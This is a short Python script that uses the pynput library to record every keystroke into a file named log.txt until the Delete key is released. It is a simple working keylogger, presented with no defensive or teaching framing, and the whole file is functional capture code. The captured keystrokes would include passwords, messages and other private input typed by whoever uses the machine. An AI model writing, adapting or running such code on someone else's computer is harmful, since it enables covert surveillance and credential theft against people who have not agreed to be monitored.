import pynput
from pynput.keyboard import Key, Listener


keys = []


def on_press(key):
	keys.append(key)
	write_file(keys)


def write_file(keys):
	with open('log.txt', 'w') as f:
		for key in keys:
			#removing ''
			k = str(key).replace("'", "") 
			f.write(k)
			#explicitly adding a space after every keystroke for readability
			f.write(' ') 


def on_release(key):
	if key == Key.delete:
		return False


with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()
